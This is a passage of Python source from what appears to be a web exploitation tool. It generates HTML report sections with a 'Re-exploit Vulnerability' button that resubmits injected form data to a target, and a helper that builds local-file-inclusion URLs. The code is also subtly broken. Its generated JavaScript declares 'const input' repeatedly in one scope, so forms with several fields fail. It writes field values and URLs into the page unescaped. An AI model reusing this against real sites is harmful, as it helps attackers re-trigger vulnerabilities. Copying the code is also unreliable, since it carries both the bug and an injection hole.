                    <input type="text" value="{field_value}" readonly>
                </div>
            """)
        
        form_html = f"""
        <div class="form-section">
            <h3>📝 Injected Form Data ({method})</h3>
            <div class="form-instructions">
                {self._get_form_instructions(method)}
            </div>
            <div class="form-data">
                {''.join(form_fields)}
            </div>
            <div class="form-actions">
                <button class="button" onclick="submitForm()">🚀 Re-exploit Vulnerability</button>
                <button class="button" onclick="copyFormData()">📋 Copy Form Data</button>
            </div>
        </div>
        
        <script>
            function submitForm() {{
                const form = document.createElement('form');
                form.method = '{method}';
                form.action = '{target_url}';
                form.target = '_blank';
                
                {self._generate_form_javascript(form_data)}
                
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
            }}
            
            function copyFormData() {{
                const data = {form_data};
                navigator.clipboard.writeText(JSON.stringify(data, null, 2));
                alert('Form data copied to clipboard!');
            }}
        </script>
        """
        
        return form_html
    
    def _get_form_instructions(self, method):
        """Genera instrucciones específicas según el método"""
        if method.upper() == "POST":
            return """
                <strong>💡 POST Form Instructions:</strong><br>
                • Click "Re-exploit Vulnerability" to open the vulnerable form in a new tab<br>
                • The form will be pre-filled with the injected data<br>
                • Submit the form to trigger the vulnerability again
            """
        else:
            return """
                <strong>💡 GET Form Instructions:</strong><br>
                • Click "Re-exploit Vulnerability" to open the vulnerable URL in a new tab<br>
                • The URL contains all the injected parameters<br>
                • The vulnerability will be triggered immediately
            """
    
    def _generate_form_javascript(self, form_data):
        """Genera JavaScript para crear campos de formulario dinámicamente"""
        js_code = []
        for field_name, field_value in form_data.items():
            js_code.append(f"""
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = '{field_name}';
                input.value = '{field_value}';
                form.appendChild(input);
            """)
        
        return '\n'.join(js_code)
    
    def _get_form_styles(self):
        """Retorna estilos CSS para los elementos del formulario"""
        return """
        .form-section {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            border: 2px solid #3498db;
        }
        
        .form-instructions {
            background: #e8f4fd;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            border-left: 4px solid #3498db;
        }
        
        .form-data {
            margin: 15px 0;
        }
        
        .form-field {
            margin: 10px 0;
        }
        
        .form-field label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #2c3e50;
        }
        
        .form-field input {
            width: 100%;
            padding: 8px;
            border: 1px solid #bdc3c7;
            border-radius: 4px;
            background: #f8f9fa;
            font-family: monospace;
        }
        
        .form-actions {
            margin-top: 20px;
            text-align: center;
        }
        """
    
    def _generate_lfi_url(self, target_url, lfi_param, payload):
        """Genera una URL LFI con el payload especificado"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(target_url)
        query_params = parse_qs(parsed.query)
        
        # Reemplazar el valor del parámetro LFI con el nuevo payload
        query_params[lfi_param] = [payload]
        
        # Reconstruir la URL
        new_query = urlencode(query_params, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)
